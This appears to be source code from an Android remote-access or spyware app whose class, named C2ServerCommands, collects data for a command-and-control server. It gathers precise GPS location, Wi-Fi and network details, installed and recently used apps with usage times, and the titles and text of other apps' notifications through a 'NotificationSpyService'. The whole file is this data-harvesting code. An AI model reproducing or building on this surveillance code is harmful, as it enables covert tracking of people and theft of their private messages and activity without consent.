package com.example.sitconnect

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.provider.Settings
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.Tasks
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Collections
import java.util.Locale
import java.util.concurrent.TimeUnit

class C2ServerCommands(private val context: Context) {

    fun getDeviceName(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        var userDeviceName: String? = null

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) { // API 25
                userDeviceName = Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME)
            }
        } catch (e: Exception) {
            // Ignore if we can't get the user-set name
        }

        return if (model.startsWith(manufacturer)) {
            userDeviceName?.let { "$it ($model)" } ?: model
        } else {
            userDeviceName?.let { "$it ($manufacturer $model)" } ?: "$manufacturer $model"
        }
    }

    fun getBatteryLevel(): String {
        val batteryStatus: Intent? = context.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))

        if (batteryStatus == null) return "Error: Could not retrieve battery stats"

        val level: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val scale: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
        val status: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
        val plugged: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)
        val health: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1)
        val temperature: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1)
        val voltage: Int = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1)
        val technology: String? = batteryStatus.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY)

        val batteryPct = if (level != -1 && scale != -1) (level * 100 / scale.toFloat()).toInt() else -1

        val statusString = when (status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not Charging"
            else -> "Unknown"
        }

        val pluggedString = when (plugged) {
            android.os.BatteryManager.BATTERY_PLUGGED_AC -> "AC"
            android.os.BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            0 -> "On Battery"
            else -> "Unknown"
        }

        val healthString = when (health) {
            android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
            android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
            android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
            android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
            android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "Unspecified Failure"
            android.os.BatteryManager.BATTERY_HEALTH_COLD -> "Cold"
            else -> "Unknown"
        }

        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        var chargeCounter = Int.MIN_VALUE
        var currentNow = Int.MIN_VALUE
        var currentAverage = Int.MIN_VALUE

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            chargeCounter = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CHARGE_COUNTER)
            currentNow = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CURRENT_NOW)
            currentAverage = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE)
        }

        return buildString {
            append("Level: $batteryPct%\n")
            append("Status: $statusString\n")
            append("Power Source: $pluggedString\n")
            append("Health: $healthString\n")
            if (voltage != -1) append("Voltage: ${voltage}mV\n")
            if (temperature != -1) append("Temperature: ${temperature / 10.0}°C\n")
            if (!technology.isNullOrEmpty()) append("Technology: $technology\n")

            if (chargeCounter != Int.MIN_VALUE) {
                append("Charge Counter: ${chargeCounter / 1000} mAh\n")
                if (level > 0 && scale > 0) {
                    val estimatedTotal = (chargeCounter / 1000.0) / (level / scale.toDouble())
                    append(String.format(Locale.US, "Estimated Capacity: %.0f mAh\n", estimatedTotal))
                }
            }
            if (currentNow != Int.MIN_VALUE) {
                val isMicroAmperes = Math.abs(currentNow) > 10000
                val currentMa = if (isMicroAmperes) currentNow / 1000.0 else currentNow.toDouble()
                append(String.format(Locale.US, "Current Now: %.1f mA\n", currentMa))
            }
            if (currentAverage != Int.MIN_VALUE) {
                val isMicroAmperes = Math.abs(currentAverage) > 10000
                val currentAvgMa = if (isMicroAmperes) currentAverage / 1000.0 else currentAverage.toDouble()
                append(String.format(Locale.US, "Current Average: %.1f mA\n", currentAvgMa))
            }
        }.trim()
    }

    fun getDeviceStats(): String {
        val sb = StringBuilder()

        val actManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        actManager.getMemoryInfo(memInfo)

        val totalMem = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
        val availMem = memInfo.availMem / (1024.0 * 1024.0 * 1024.0)
        sb.append(String.format(Locale.US, "RAM: %.2fGB Free / %.2fGB Total", availMem, totalMem))

        if (Build.VERSION.SDK_INT >= 34) {
            val advertisedMem = memInfo.advertisedMem / (1024.0 * 1024.0 * 1024.0)
            if (advertisedMem > 0) {
                sb.append(String.format(Locale.US, " / %.2fGB Advertised", advertisedMem))
            }
        }
        sb.append("\n")

        var storageTotalBytes: Long = 0
        var storageFreeBytes: Long = 0
        var usedStorageStats = false

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val storageStatsManager = context.getSystemService(Context.STORAGE_STATS_SERVICE) as android.app.usage.StorageStatsManager
                val uuid = android.os.storage.StorageManager.UUID_DEFAULT
                storageTotalBytes = storageStatsManager.getTotalBytes(uuid)
                storageFreeBytes = storageStatsManager.getFreeBytes(uuid)
                usedStorageStats = true
            } catch (e: Exception) {
            }
        }

        if (!usedStorageStats) {
            val internal = android.os.Environment.getDataDirectory()
            storageTotalBytes = internal.totalSpace
            storageFreeBytes = internal.freeSpace
        }

        val totalGb = storageTotalBytes / (1000.0 * 1000.0 * 1000.0)
        val freeGb = storageFreeBytes / (1000.0 * 1000.0 * 1000.0)

        sb.append(String.format(Locale.US, "Internal Storage: %.2fGB Free / %.2fGB Total\n", freeGb, totalGb))
        sb.append("CPU ABI: ${Build.SUPPORTED_ABIS.joinToString(", ")}\n")

        val uptimeMillis = android.os.SystemClock.elapsedRealtime()
        val hours = TimeUnit.MILLISECONDS.toHours(uptimeMillis)
        val minutes = TimeUnit.MILLISECONDS.toMinutes(uptimeMillis) % 60
        sb.append("Uptime: ${hours}h ${minutes}m")

        return sb.toString()
    }

    fun getNetworkInfo(): String {
        val sb = StringBuilder()
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        val linkProperties = connectivityManager.getLinkProperties(network)

        if (capabilities != null) {
            sb.append("Active Network:\n")
            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                sb.append("  Type: Wi-Fi\n")
                val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
                val wifiInfo = wifiManager.connectionInfo
                sb.append("  SSID: ${wifiInfo.ssid}\n")
                sb.append("  BSSID: ${wifiInfo.bssid}\n")
                sb.append("  RSSI: ${wifiInfo.rssi} dBm\n")
                sb.append("  Link Speed: ${wifiInfo.linkSpeed} Mbps\n")
                sb.append("  Frequency: ${wifiInfo.frequency} MHz\n")
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                sb.append("  Type: Cellular\n")
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                sb.append("  Type: Ethernet\n")
            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                sb.append("  Type: VPN\n")
            }

            sb.append("  Downstream Bandwidth: ${capabilities.linkDownstreamBandwidthKbps / 1000} Mbps\n")
            sb.append("  Upstream Bandwidth: ${capabilities.linkUpstreamBandwidthKbps / 1000} Mbps\n")
        } else {
            sb.append("No active network capabilities found.\n")
        }

        if (linkProperties != null) {
            sb.append("Link Properties:\n")
            sb.append("  Interface Name: ${linkProperties.interfaceName}\n")
            for (linkAddress in linkProperties.linkAddresses) {
                sb.append("  IP Address: ${linkAddress.address.hostAddress}\n")
            }
            for (route in linkProperties.routes) {
                sb.append("  Route: ${route.destination}\n")
            }
            if (linkProperties.dnsServers.isNotEmpty()) {
                sb.append("  DNS: ${linkProperties.dnsServers.joinToString(", ") { it.hostAddress ?: "unknown" }}\n")
            }
        }

        sb.append("\nAll Network Interfaces:\n")
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (intf.isUp) {
                    val addrs = Collections.list(intf.inetAddresses)
                    for (addr in addrs) {
                        if (!addr.isLoopbackAddress) {
                            val type = if (addr is Inet4Address) "IPv4" else "IPv6"
                            sb.append("  ${intf.name} ($type): ${addr.hostAddress}\n")
                        }
                    }
                }
            }
        } catch (e: Exception) {
            sb.append("Error getting network interfaces: ${e.message}\n")
        }

        return sb.toString()
    }

    fun getLocationAccessLevel(): String {
        val fineGranted = context.packageManager.checkPermission(
            Manifest.permission.ACCESS_FINE_LOCATION, context.packageName
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarseGranted = context.packageManager.checkPermission(
            Manifest.permission.ACCESS_COARSE_LOCATION, context.packageName
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (!fineGranted && !coarseGranted) return "Disallowed"

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val backgroundGranted = context.packageManager.checkPermission(
                Manifest.permission.ACCESS_BACKGROUND_LOCATION, context.packageName
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (backgroundGranted) "Allowed all the time" else "Only while using the app"
        } else {
            "Allowed all the time"
        }
    }

    fun getLocationPermissionType(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val fineGranted = context.packageManager.checkPermission(
                Manifest.permission.ACCESS_FINE_LOCATION, context.packageName
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (fineGranted) "Precise" else "Approximate"
        } else {
            "Precise"
        }
    }

    fun locationUnavailable(): String {
        var locationString = "Location unavailable"
        locationString += "\nLocation Permission: ${getLocationPermissionType()}"
        locationString += "\nLocation Access: ${getLocationAccessLevel()}"
        return locationString
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    fun getDeviceLocation(): String {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
        var locationString = ""

        return try {
            val location = Tasks.await(fusedLocationClient.lastLocation, 3, TimeUnit.SECONDS)
            if (location != null) {
                val coordinates = String.format(Locale.US, "%.6f, %.6f", location.latitude, location.longitude)
                locationString = "Location: $coordinates"
                val altitude = location.altitude
                locationString += "\nAltitude: $altitude"
                val speed = location.speed
                locationString += "\nSpeed: $speed"
                val accuracy = location.accuracy
                locationString += "\nAccuracy: $accuracy"
                locationString += "\nLocation Permission: ${getLocationPermissionType()}"
                locationString += "\nLocation Access: ${getLocationAccessLevel()}"
                val bearing = location.bearing
                locationString += "\nBearing: $bearing"
                val provider = location.provider
                locationString += "\nProvider: $provider"
                val isMock = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    location.isMock
                } else {
                    @Suppress("DEPRECATION")
                    location.isFromMockProvider
                }
                locationString += "\nIs From Mock Provider: $isMock"
                locationString
            } else {
                locationUnavailable()
            }
        } catch (e: Exception) {
            locationUnavailable()
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    fun getInstalledApps(): String {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(0)

        return apps.map { appInfo ->
            val appName = pm.getApplicationLabel(appInfo).toString()
            val packageName = appInfo.packageName
            "$appName ($packageName)"
        }.sorted().joinToString(separator = "\n").ifEmpty { "No apps found" }
    }

    @SuppressLint("QueryPermissionsNeeded")
    fun getUserInstalledApps(): String {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(0)

        return apps.filter { appInfo ->
            (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0
        }.map { appInfo ->
            val appName = pm.getApplicationLabel(appInfo).toString()
            val packageName = appInfo.packageName
            "$appName ($packageName)"
        }.sorted().joinToString(separator = "\n").ifEmpty { "No user apps found" }
    }

    fun getRunningApps(): String {
        return try {
            val pm = context.packageManager
            var result = ""

            // Try UsageStatsManager first (requires PACKAGE_USAGE_STATS permission)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                val time = System.currentTimeMillis()
                // Look at the last hour
                val usageStats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60 * 60, time)

                if (!usageStats.isNullOrEmpty()) {
                    val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                    result = usageStats.filter { it.lastTimeUsed > 0 && it.packageName != context.packageName }
                        .sortedByDescending { it.lastTimeUsed }
                        .distinctBy { it.packageName } // Keep only the most recent entry per package
                        .map { stats ->
                            val packageName = stats.packageName
                            val appName = try {
                                val appInfo = pm.getApplicationInfo(packageName, 0)
                                pm.getApplicationLabel(appInfo).toString()
                            } catch (e: Exception) {
                                "Unknown"
                            }

                            val lastUsed = dateFormat.format(java.util.Date(stats.lastTimeUsed))
                            val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.totalTimeInForeground)
                            val secs = java.util.concurrent.TimeUnit.MILLISECONDS.toSeconds(stats.totalTimeInForeground) % 60

                            "$appName ($packageName)\n    └ Last used: $lastUsed | Foreground time: ${mins}m ${secs}s"
                        }.joinToString(separator = "\n")
                }
            }

            // Fallback to ActivityManager (will likely only show this app on modern Android without permissions)
            if (result.isEmpty()) {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                val runningApps = am.runningAppProcesses

                if (runningApps.isNullOrEmpty()) {
                    result = "No running apps found (May need PACKAGE_USAGE_STATS permission)"
                } else {
                    result = runningApps.map { processInfo ->
                        val packageName = processInfo.processName
                        val appName = try {
                            val appInfo = pm.getApplicationInfo(packageName, 0)
                            pm.getApplicationLabel(appInfo).toString()
                        } catch (e: Exception) {
                            "Unknown"
                        }
                        val importance = processInfo.importance
                        "$appName ($packageName) [imp:$importance]"
                    }.sorted().joinToString(separator = "\n")
                }
            }

            result
        } catch (e: Exception) {
            "Error getting running apps: ${e.message}"
        }
    }

    fun sendNotification(title: String, message: String) {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val notification = NotificationCompat.Builder(context, AgentService.CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()
        notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
    }

    fun getActiveNotifications(): String {
        val service = NotificationSpyService.instance
        if (service == null) {
            return "Notification listener service not active. Notification access might be denied."
        }

        val notifications = service.getActiveNotificationsList()
        if (notifications.isEmpty()) {
            return "No active notifications found."
        }

        val sb = StringBuilder()
        val pm = context.packageManager
        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

        for (sbn in notifications) {
            val packageName = sbn.packageName
            val appName = try {
                val appInfo = pm.getApplicationInfo(packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: Exception) {
                "Unknown App"
            }

            val postTime = sbn.postTime
            val timeString = dateFormat.format(java.util.Date(postTime))

            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE) ?: "No Title"
            val text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: "No Text"

            sb.append("Package: $packageName ($appName)\n")
            sb.append("Time: $timeString\n")
            sb.append("Title: $title\n")
            sb.append("Text: $text\n")
            sb.append("----------------------------\n")
        }
        return sb.toString().trim()
    }
}
